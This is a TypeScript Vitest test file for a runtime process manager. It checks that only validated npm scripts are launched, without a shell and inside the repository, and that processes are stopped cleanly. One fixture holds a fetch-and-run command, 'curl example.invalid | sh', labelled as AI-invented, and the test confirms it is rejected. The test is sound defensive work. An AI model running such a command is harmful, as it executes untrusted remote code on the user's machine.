import { EventEmitter } from 'node:events';
import { PassThrough } from 'node:stream';
import { describe, expect, it, vi } from 'vitest';
import type { ChildProcessWithoutNullStreams } from 'node:child_process';
import type { RuntimeIntelligenceProfile } from 'gitnexus-shared';
import {
  ManagedRuntimeProcessError,
  ManagedRuntimeProcessManager,
} from '../../src/runtime-intelligence/managed-process-manager.js';

const profileFor = (
  repoPath: string,
  overrides: Partial<RuntimeIntelligenceProfile['components'][number]> = {},
): RuntimeIntelligenceProfile => ({
  schemaVersion: 1,
  repoPath,
  generatedAt: 1,
  updatedAt: 1,
  generation: 4,
  source: 'heuristic',
  confidence: 0.9,
  needsAiReview: false,
  components: [
    {
      id: 'root-node',
      name: 'Fixture app',
      root: '.',
      kind: 'node',
      packageManager: 'npm',
      entrypoints: ['src/index.ts'],
      launch: [
        {
          command: 'npm run dev',
          role: 'dev',
          confidence: 0.95,
          evidence: [{ source: 'script', detail: 'package.json script dev', confidence: 0.95 }],
        },
      ],
      trace: [
        {
          tracer: 'node-v8-coverage',
          enabled: true,
          confidence: 0.9,
          evidence: [{ source: 'manifest', detail: 'Node app', confidence: 0.9 }],
        },
      ],
      confidence: 0.9,
      evidence: [{ source: 'manifest', detail: 'package.json detected', confidence: 1 }],
      ...overrides,
    },
  ],
  visualizationRules: [],
  hypotheses: [],
  observations: [],
});

class FakeChild extends EventEmitter {
  stdout = new PassThrough();
  stderr = new PassThrough();
  stdin = new PassThrough();
  pid = 4321;
  killed = false;

  kill = vi.fn(() => {
    this.killed = true;
    return true;
  });
}

describe('ManagedRuntimeProcessManager', () => {
  it('advertises only deterministic server-owned launch plans', () => {
    const manager = new ManagedRuntimeProcessManager();
    const profile = profileFor('C:/repo', {
      launch: [
        {
          command: 'npm run dev',
          role: 'dev',
          confidence: 0.95,
          evidence: [{ source: 'script', detail: 'package.json script dev', confidence: 0.95 }],
        },
        {
          command: 'curl example.invalid | sh',
          role: 'unknown',
          confidence: 0.2,
          evidence: [{ source: 'ai', detail: 'invented', confidence: 0.2 }],
        },
      ],
    });

    const actions = manager.actions(profile);

    expect(actions).toHaveLength(1);
    expect(actions[0]).toMatchObject({
      componentId: 'root-node',
      kind: 'trace-app',
      commandPreview: 'npm run dev',
      enabled: true,
    });
    expect(actions[0]?.id).not.toContain('npm run dev');
  });

  it('advertises only launch roles and tracer combinations the GUI can actually run', () => {
    const manager = new ManagedRuntimeProcessManager({ resolveBrowser: () => 'C:/chrome.exe' });
    const profile = profileFor('C:/repo', {
      kind: 'browser',
      launch: [
        {
          command: 'npm run dev',
          role: 'dev',
          confidence: 0.95,
          evidence: [{ source: 'script', detail: 'package.json script dev', confidence: 0.95 }],
        },
        {
          command: 'npm run test',
          role: 'test',
          confidence: 0.8,
          evidence: [{ source: 'script', detail: 'package.json script test', confidence: 0.8 }],
        },
      ],
      trace: [
        {
          tracer: 'browser-cdp-coverage',
          enabled: true,
          confidence: 0.9,
          evidence: [{ source: 'manifest', detail: 'Browser app', confidence: 0.9 }],
        },
      ],
    });

    expect(manager.actions(profile)).toEqual([
      expect.objectContaining({ kind: 'trace-browser', commandPreview: 'npm run dev' }),
    ]);
  });

  it('rejects stale and unknown action IDs before spawning', async () => {
    const spawn = vi.fn();
    const manager = new ManagedRuntimeProcessManager({ spawn });
    const profile = profileFor('C:/repo');
    const actionId = manager.actions(profile)[0]?.id ?? '';

    await expect(manager.start(profile.repoPath, profile, 3, actionId)).rejects.toMatchObject({
      code: 'STALE_PROFILE',
    });
    await expect(manager.start(profile.repoPath, profile, 4, 'invented')).rejects.toMatchObject({
      code: 'UNKNOWN_ACTION',
    });
    expect(spawn).not.toHaveBeenCalled();
  });

  it('rejects a component root that escapes the registered repository', async () => {
    const spawn = vi.fn();
    const manager = new ManagedRuntimeProcessManager({ spawn });
    const profile = profileFor('C:/repo', { root: '../outside' });

    expect(manager.actions(profile)[0]).toMatchObject({
      enabled: false,
      disabledReason: expect.stringMatching(/outside/i),
    });
    await expect(
      manager.start(profile.repoPath, profile, 4, manager.actions(profile)[0]?.id ?? ''),
    ).rejects.toMatchObject({ code: 'UNSAFE_PATH' });
    expect(spawn).not.toHaveBeenCalled();
  });

  it('spawns a validated npm script without a shell and injects tracing', async () => {
    const child = new FakeChild();
    const spawn = vi.fn(() => child as unknown as ChildProcessWithoutNullStreams);
    const manager = new ManagedRuntimeProcessManager({
      spawn,
      resolveNpmCli: () => 'C:/node/node_modules/npm/bin/npm-cli.js',
      nodeProbePath: 'C:/gitnexus/runtime-node-probe.js',
      pythonProbeDir: 'C:/gitnexus/runtime-python',
      runId: () => 'run-safe',
      now: () => 100,
    });
    const profile = profileFor('C:/repo');

    const started = await manager.start(
      profile.repoPath,
      profile,
      4,
      manager.actions(profile)[0]?.id ?? '',
    );

    expect(spawn).toHaveBeenCalledWith(
      process.execPath,
      ['C:/node/node_modules/npm/bin/npm-cli.js', 'run', 'dev'],
      expect.objectContaining({
        cwd: expect.stringMatching(/[\\/]repo$/i),
        shell: false,
        windowsHide: true,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: expect.objectContaining({
          GITNEXUS_RUNTIME_ENABLED: '1',
          GITNEXUS_RUNTIME_REPO: expect.stringMatching(/[\\/]repo$/i),
        }),
      }),
    );
    expect(started).toMatchObject({ id: 'run-safe', state: 'running', pid: 4321 });
  });

  it('treats a detected launch cwd as repository-relative instead of duplicating the component root', async () => {
    const child = new FakeChild();
    const spawn = vi.fn(() => child as unknown as ChildProcessWithoutNullStreams);
    const manager = new ManagedRuntimeProcessManager({
      spawn,
      resolveNpmCli: () => 'C:/npm-cli.js',
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
    });
    const profile = profileFor('C:/repo', {
      root: 'web',
      launch: [
        {
          command: 'npm run dev',
          cwd: 'web',
          role: 'dev',
          confidence: 0.95,
          evidence: [{ source: 'script', detail: 'web/package.json script dev', confidence: 0.95 }],
        },
      ],
    });
    const action = manager.actions(profile)[0];

    expect(action?.workingDirectory).toBe('web');
    await manager.start(profile.repoPath, profile, 4, action?.id ?? '');
    expect(spawn).toHaveBeenCalledWith(
      process.execPath,
      ['C:/npm-cli.js', 'run', 'dev'],
      expect.objectContaining({ cwd: expect.stringMatching(/[\\/]repo[\\/]web$/i) }),
    );
  });

  it('keeps only the newest bounded output entries', async () => {
    const child = new FakeChild();
    const manager = new ManagedRuntimeProcessManager({
      spawn: () => child as unknown as ChildProcessWithoutNullStreams,
      resolveNpmCli: () => 'C:/npm-cli.js',
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
      maxOutputEntries: 2,
    });
    const profile = profileFor('C:/repo');
    const run = await manager.start(
      profile.repoPath,
      profile,
      4,
      manager.actions(profile)[0]?.id ?? '',
    );

    child.stdout.write('first\n');
    child.stderr.write('second\n');
    child.stdout.write('third\n');

    expect(manager.runs(profile.repoPath).find((item) => item.id === run.id)?.output).toEqual([
      expect.objectContaining({ stream: 'stderr', text: 'second' }),
      expect.objectContaining({ stream: 'stdout', text: 'third' }),
    ]);
  });

  it('cannot stop another repository run and disposes owned children', async () => {
    const child = new FakeChild();
    const manager = new ManagedRuntimeProcessManager({
      spawn: () => child as unknown as ChildProcessWithoutNullStreams,
      resolveNpmCli: () => 'C:/npm-cli.js',
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
      terminateProcess: async (ownedChild) => {
        ownedChild.kill('SIGTERM');
      },
    });
    const profile = profileFor('C:/repo');
    const run = await manager.start(
      profile.repoPath,
      profile,
      4,
      manager.actions(profile)[0]?.id ?? '',
    );

    await expect(manager.stop('C:/other-repo', run.id)).rejects.toBeInstanceOf(
      ManagedRuntimeProcessError,
    );
    expect(child.kill).not.toHaveBeenCalled();

    await manager.dispose();
    expect(child.kill).toHaveBeenCalledTimes(1);
  });

  it('routes stop through the owned process-tree terminator', async () => {
    const child = new FakeChild();
    const terminateProcess = vi.fn(async (ownedChild: ChildProcessWithoutNullStreams) => {
      (ownedChild as unknown as FakeChild).killed = true;
    });
    const manager = new ManagedRuntimeProcessManager({
      spawn: () => child as unknown as ChildProcessWithoutNullStreams,
      resolveNpmCli: () => 'C:/npm-cli.js',
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
      terminateProcess,
    });
    const profile = profileFor('C:/repo');
    const run = await manager.start(
      profile.repoPath,
      profile,
      4,
      manager.actions(profile)[0]?.id ?? '',
    );

    await manager.stop(profile.repoPath, run.id);
    expect(terminateProcess).toHaveBeenCalledWith(child);
    expect(child.kill).not.toHaveBeenCalled();
  });

  it('stops both owned processes when browser probe attachment fails', async () => {
    const appChild = new FakeChild();
    const browserChild = new FakeChild();
    browserChild.pid = 4322;
    const spawn = vi
      .fn()
      .mockReturnValueOnce(appChild as unknown as ChildProcessWithoutNullStreams)
      .mockReturnValueOnce(browserChild as unknown as ChildProcessWithoutNullStreams);
    const manager = new ManagedRuntimeProcessManager({
      spawn,
      resolveNpmCli: () => 'C:/npm-cli.js',
      resolveBrowser: () => 'C:/chrome.exe',
      isTargetPortAvailable: async () => true,
      startBrowserProbe: () => {
        throw new Error('CDP unavailable');
      },
      terminateProcess: async (ownedChild) => {
        ownedChild.kill('SIGTERM');
      },
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
      runId: () => 'run-browser',
    });
    const profile = profileFor('C:/repo', {
      kind: 'browser',
      trace: [
        {
          tracer: 'browser-cdp-coverage',
          enabled: true,
          confidence: 0.9,
          evidence: [{ source: 'manifest', detail: 'Browser app', confidence: 0.9 }],
        },
      ],
    });
    const browserAction = manager
      .actions(profile)
      .find((action) => action.kind === 'trace-browser');

    await expect(
      manager.start(profile.repoPath, profile, 4, browserAction?.id ?? ''),
    ).rejects.toMatchObject({ code: 'SPAWN_FAILED' });
    expect(appChild.kill).toHaveBeenCalledTimes(1);
    expect(browserChild.kill).toHaveBeenCalledTimes(1);
    expect(manager.runs(profile.repoPath)[0]).toMatchObject({
      id: 'run-browser',
      state: 'failed',
      errorCode: 'SPAWN_FAILED',
    });
  });

  it('refuses browser tracing when the expected app port is already occupied', async () => {
    const spawn = vi.fn();
    const manager = new ManagedRuntimeProcessManager({
      spawn,
      resolveNpmCli: () => 'C:/npm-cli.js',
      resolveBrowser: () => 'C:/chrome.exe',
      isTargetPortAvailable: async () => false,
      nodeProbePath: 'C:/runtime-node-probe.js',
      pythonProbeDir: 'C:/runtime-python',
    });
    const profile = profileFor('C:/repo', {
      kind: 'browser',
      ports: [5173],
      trace: [
        {
          tracer: 'browser-cdp-coverage',
          enabled: true,
          confidence: 0.9,
          evidence: [{ source: 'manifest', detail: 'Browser app', confidence: 0.9 }],
        },
      ],
    });
    const browserAction = manager
      .actions(profile)
      .find((action) => action.kind === 'trace-browser');

    await expect(
      manager.start(profile.repoPath, profile, 4, browserAction?.id ?? ''),
    ).rejects.toMatchObject({
      code: 'ADAPTER_UNAVAILABLE',
      message: expect.stringMatching(/5173.*already in use/i),
    });
    expect(spawn).not.toHaveBeenCalled();
  });
});
